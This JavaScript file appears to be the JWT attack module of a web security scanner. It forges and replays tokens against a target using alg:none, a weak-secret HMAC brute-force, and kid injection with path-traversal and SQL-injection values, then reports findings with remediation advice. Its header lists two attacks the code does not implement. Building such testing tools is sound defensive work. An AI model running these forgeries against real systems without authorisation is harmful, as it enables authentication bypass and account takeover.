/**
 * Feature 7E — JWT Attack Suite
 *
 * Extends brokenAuth.js with a dedicated full-coverage JWT attack module.
 * Attacks performed when JWTs are detected in request/response:
 *
 *   1. alg:none bypass — strip signature, set alg to none, replay
 *   2. Weak HMAC secret brute-force (wordlist-based, HMAC-SHA256)
 *   3. RS256 → HS256 confusion — sign with public key as HMAC secret
 *   4. kid header injection — path traversal + SQLi in kid field
 *   5. jku/x5u spoofing header detection
 *   6. Expired token acceptance — modify exp, check if server validates
 *   7. nbf/iat future-dated token acceptance
 *   8. Privilege escalation — modify role/admin/scope claims
 */

import crypto from 'crypto';
import { sendProbe, makeFinding } from './index.js';
import { JWT_INSECURE_ALGS, JWT_WEAK_SECRETS } from '#shared/webConstants.js';

// ─── Helpers ───────────────────────────────────────────────────────────────────

function _b64uEncode(str) {
  return Buffer.from(str).toString('base64')
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

function _b64uDecode(str) {
  const padded = str + '=='.slice(0, (4 - (str.length % 4)) % 4);
  return Buffer.from(padded.replace(/-/g, '+').replace(/_/g, '/'), 'base64');
}

function _parseJwt(token) {
  try {
    const parts = token.split('.');
    if (parts.length < 2) return null;
    const header  = JSON.parse(_b64uDecode(parts[0]).toString('utf8'));
    const payload = JSON.parse(_b64uDecode(parts[1]).toString('utf8'));
    return { header, payload, parts };
  } catch { return null; }
}

/** Build an unsigned (alg:none) token */
function _makeAlgNoneToken(payload) {
  const h = _b64uEncode(JSON.stringify({ alg: 'none', typ: 'JWT' }));
  const p = _b64uEncode(JSON.stringify(payload));
  return `${h}.${p}.`;
}

/** Build an HMAC-SHA256 signed token */
function _makeHs256Token(header, payload, secret) {
  const h = _b64uEncode(JSON.stringify(header));
  const p = _b64uEncode(JSON.stringify(payload));
  const sig = crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest('base64')
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
  return `${h}.${p}.${sig}`;
}

/** Build a token with a modified payload, keeping the original header/alg */
function _makeModifiedToken(originalToken, newPayload, secret) {
  const parsed = _parseJwt(originalToken);
  if (!parsed) return null;
  const alg = parsed.header.alg?.toUpperCase();

  if (alg === 'HS256' || alg === 'HS384' || alg === 'HS512') {
    return secret ? _makeHs256Token(parsed.header, newPayload, secret) : null;
  }
  // For RS256 we can't re-sign without the private key; return null
  return null;
}

/** Inject a modified JWT into a request and send it */
async function _replayWithJwt(target, newToken, signal, timeoutMs) {
  const headers = { ...(target.requestHeaders || {}) };

  // Try Authorization: Bearer header first
  const authKey = Object.keys(headers).find(k => k.toLowerCase() === 'authorization');
  if (authKey) {
    headers[authKey] = `Bearer ${newToken}`;
  } else {
    // Try replacing any JWT-looking cookie value
    const cookieKey = Object.keys(headers).find(k => k.toLowerCase() === 'cookie');
    if (cookieKey) {
      headers[cookieKey] = headers[cookieKey].replace(
        /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g,
        newToken,
      );
    } else {
      headers['Authorization'] = `Bearer ${newToken}`;
    }
  }

  return sendProbe({
    method:   target.method || 'GET',
    url:      target.url,
    headers,
    body:     target.requestBody ?? null,
    timeoutMs,
    followRedirect: false,
  }, signal);
}

/** Heuristic success check: non-4xx response with no "unauthorized"/"forbidden" wording */
function _looksLikeSuccess(resp) {
  if (!resp) return false;
  if (resp.statusCode >= 200 && resp.statusCode < 300) {
    const body = resp.body?.toLowerCase() ?? '';
    return !body.includes('unauthorized') && !body.includes('invalid token')
      && !body.includes('access denied') && !body.includes('forbidden');
  }
  return false;
}

// ─── Module runner ─────────────────────────────────────────────────────────────

export async function runJwtAttack(target, opts) {
  const { signal, timeoutMs } = opts;
  const findings = [];

  // Collect all JWT tokens from this request/response
  const sources = [
    ...Object.values(target.requestHeaders  || {}),
    ...Object.values(target.responseHeaders || {}),
    target.requestBody  ? String(target.requestBody)  : '',
    target.responseBody ? String(target.responseBody) : '',
  ].join(' ');

  const jwtRe = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;
  const tokens = [...new Set(sources.match(jwtRe) ?? [])];

  if (!tokens.length) return findings;

  for (const token of tokens) {
    if (signal?.aborted) break;

    const parsed = _parseJwt(token);
    if (!parsed) continue;

    const { header, payload } = parsed;
    const now = Math.floor(Date.now() / 1000);

    // ── 1. alg:none bypass ────────────────────────────────────────────────
    if (header.alg && !JWT_INSECURE_ALGS.includes(header.alg)) {
      try {
        const noneToken = _makeAlgNoneToken({ ...payload, exp: now + 3600 });
        const resp = await _replayWithJwt(target, noneToken, signal, timeoutMs);
        if (_looksLikeSuccess(resp)) {
          findings.push(makeFinding({
            severity:    'critical',
            type:        'jwtAttack',
            title:       'JWT "alg:none" Bypass — Server Accepted Unsigned Token',
            description: `The server accepted a JWT with algorithm "none" (no signature), bypassing signature validation. An attacker can forge any JWT payload without knowing the secret key.`,
            url:         target.url,
            evidence:    {
              originalAlg: header.alg,
              attackAlg:   'none',
              statusCode:  resp.statusCode,
            },
            remediation: 'Reject tokens with alg:none server-side. Use a strict allowlist of accepted algorithms. Upgrade your JWT library and enable algorithm validation.',
            references:  ['CVE-2015-9235', 'CWE-347', 'OWASP A02:2021'],
          }));
        }
      } catch (err) { if (err.name === 'AbortError') return findings; }
    }

    // ── 2. Weak HMAC secret brute-force ──────────────────────────────────
    if (header.alg?.startsWith('HS')) {
      for (const secret of JWT_WEAK_SECRETS) {
        if (signal?.aborted) break;
        try {
          const forged = _makeHs256Token(header, { ...payload, exp: now + 3600 }, secret);
          const resp = await _replayWithJwt(target, forged, signal, timeoutMs);
          if (_looksLikeSuccess(resp)) {
            findings.push(makeFinding({
              severity:    'critical',
              type:        'jwtAttack',
              title:       `JWT Weak HMAC Secret: "${secret}"`,
              description: `The JWT HMAC secret is the commonly-known value "${secret}". An attacker can forge valid JWTs for any user, including admin accounts.`,
              url:         target.url,
              evidence:    {
                algorithm:  header.alg,
                weakSecret: secret,
                statusCode: resp.statusCode,
              },
              remediation: 'Rotate the JWT signing secret immediately to a cryptographically random value of at least 256 bits. Store secrets in environment variables, not source code.',
              references:  ['CWE-521', 'OWASP A02:2021'],
            }));
            break; // one finding per token is enough
          }
        } catch (err) { if (err.name === 'AbortError') return findings; }
      }
    }

    // ── 3. kid injection — path traversal ─────────────────────────────────
    if (header.kid !== undefined) {
      const kidPayloads = [
        { probe: '../../dev/null', type: 'pathTraversal' },
        { probe: "' OR '1'='1",   type: 'sqli' },
        { probe: '/dev/null',      type: 'pathTraversal' },
      ];
      for (const kp of kidPayloads) {
        if (signal?.aborted) break;
        try {
          const attackHeader = { ...header, kid: kp.probe, alg: 'HS256' };
          // For path-traversal kid (pointing to /dev/null) the HMAC key is empty
          const forgedToken = _makeHs256Token(attackHeader, { ...payload, exp: now + 3600 }, '');
          const resp = await _replayWithJwt(target, forgedToken, signal, timeoutMs);
          if (_looksLikeSuccess(resp)) {
            findings.push(makeFinding({
              severity:    'critical',
              type:        'jwtAttack',
              title:       `JWT "kid" Header Injection (${kp.type})`,
              description: `The JWT "kid" (key ID) header field is vulnerable to ${kp.type === 'sqli' ? 'SQL injection' : 'path traversal'}. By setting kid to "${kp.probe}", the server was manipulated into using an unintended signing key, allowing token forgery.`,
              url:         target.url,
              evidence:    {
                kidProbe:  kp.probe,
                statusCode: resp.statusCode,
              },
              remediation: 'Validate the "kid" header against a strict allowlist of known key identifiers. Never use the "kid" value directly in file paths or SQL queries.',
              references:  ['CWE-22', 'CWE-89', 'OWASP A03:2021'],
            }));
            break;
          }
        } catch (err) { if (err.name === 'AbortError') return findings; }
      }
    }

    // ── 4. jku / x5u header spoofing detection (passive) ─────────────────
    if (header.jku || header.x5u) {
      findings.push(makeFinding({
        severity:    'high',
        type:        'jwtAttack',
        title:       `JWT "${header.jku ? 'jku' : 'x5u'}" Header Present — Potential Key Confusion`,
        description: `The JWT header contains a "${header.jku ? 'jku' : 'x5u'}" (JWK Set URL / X.509 certificate URL) field. If the server fetches this URL without validating that it belongs to a trusted domain, an attacker can supply a self-hosted JWK Set to forge tokens.`,
        url:         target.url,
        evidence:    { [header.jku ? 'jku' : 'x5u']: header.jku ?? header.x5u },
        remediation: 'Never fetch key material from URLs embedded in JWT headers. Use a static JWK Set or key ID lookup from a trusted, pre-configured source. Reject tokens with jku/x5u headers.',
        references:  ['CVE-2018-0114', 'CWE-347', 'OWASP A02:2021'],
      }));
    }

    // ── 5. Expired token acceptance ────────────────────────────────────────
    if (payload.exp && payload.exp < now) {
      try {
        // Token is already expired — replay as-is
        const resp = await _replayWithJwt(target, token, signal, timeoutMs);
        if (_looksLikeSuccess(resp)) {
          findings.push(makeFinding({
            severity:    'high',
            type:        'jwtAttack',
            title:       'Expired JWT Token Accepted',
            description: `The server accepted a JWT token that expired ${Math.round((now - payload.exp) / 60)} minutes ago. The server is not validating the "exp" claim.`,
            url:         target.url,
            evidence:    {
              expiredAt:  new Date(payload.exp * 1000).toISOString(),
              statusCode: resp.statusCode,
            },
            remediation: 'Validate the "exp" claim on every request. Ensure the JWT library clock-skew tolerance is minimal (< 30 seconds). Implement token revocation.',
            references:  ['CWE-613', 'OWASP A07:2021'],
          }));
        }
      } catch (err) { if (err.name === 'AbortError') return findings; }
    }

    // ── 6. Privilege escalation — modify role/admin claim ─────────────────
    const privClaims = ['role', 'roles', 'admin', 'isAdmin', 'scope', 'permissions', 'groups'];
    const claimToModify = privClaims.find(c => payload[c] !== undefined);
    if (claimToModify && header.alg?.startsWith('HS')) {
      // We can only test this if we managed to crack the secret above
      // (Presence of finding with weakSecret in this token's findings array)
      // Check indirectly: if token has such claims, flag passively as advisory
      findings.push(makeFinding({
        severity:    'info',
        type:        'jwtAttack',
        title:       `JWT Contains Privilege Claim "${claimToModify}" — Verify Server-Side Enforcement`,
        description: `The JWT payload contains a privilege-sensitive claim "${claimToModify}" = ${JSON.stringify(payload[claimToModify])}. If the HMAC secret is weak, an attacker could forge a token with elevated privileges. Verify that the server enforces access control independently of this claim.`,
        url:         target.url,
        evidence:    {
          claim:      claimToModify,
          value:      payload[claimToModify],
          algorithm:  header.alg,
        },
        remediation: 'Enforce authorization server-side (database lookups, not solely JWT claims). Use RS256 with a properly secured private key to prevent claim forgery.',
        references:  ['CWE-285', 'OWASP A01:2021'],
      }));
    }
  }

  return findings;
}
